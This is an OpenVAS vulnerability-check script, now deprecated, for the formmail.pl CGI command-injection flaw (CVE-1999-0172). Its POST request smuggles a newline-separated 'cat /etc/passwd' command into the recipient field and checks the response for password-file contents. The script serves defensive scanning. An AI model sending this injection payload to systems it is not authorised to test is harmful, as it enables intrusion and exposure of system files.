###############################################################################
# OpenVAS Vulnerability Test
# $Id: formmail_pl.nasl 10771 2018-08-04 15:18:29Z cfischer $
#
# formmail.pl
#
# Authors:
# Mathieu Perrin <mathieu@tpfh.org>
#
# Copyright:
# Copyright (C) 1999 Mathieu Perrin
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10076");
  script_version("$Revision: 10771 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-04 17:18:29 +0200 (Sat, 04 Aug 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2079);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-1999-0172");
  script_name("formmail.pl");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 1999 Mathieu Perrin");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("FormMail/installed");

  script_tag(name:"solution", value:"Remove it from /cgi-bin.");

  script_tag(name:"summary", value:"The 'formmail.pl' is installed. This CGI has a well known security flaw
  that lets anyone execute arbitrary commands with the privileges of the http daemon (root or nobody).");

  script_tag(name:"deprecated", value:TRUE);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"Workaround");

  exit(0);
}

# deprecated
exit(66);

include("http_func.inc");

port = get_http_port(default:80);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  a = string("POST ", dir, "/formmail.pl HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n");
  aa = string("POST ", dir, "/formmail HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n");

  b = string("Content-length: 120\r\n\r\n");
  c = string("recipient=root@localhost%0Acat%20/etc/passwd&email=openvas@localhost&subject=test\r\n\r\n");
  d = crap(200);
  soc = http_open_socket(port);
  if(soc){
    req1 = a+b+c+d;
    send(socket:soc, data:req1);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    if("root:" >< r){
      security_message(port:port);
      exit(0);
    }

    soc2 = http_open_socket(port);
    if(!soc2)exit(0);
    req2 = aa+b+c+d;
    send(socket:soc2, data:req2);
    r2 = http_recv(socket:soc2);
    http_close_socket(soc2);
    if("root:" >< r2){
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);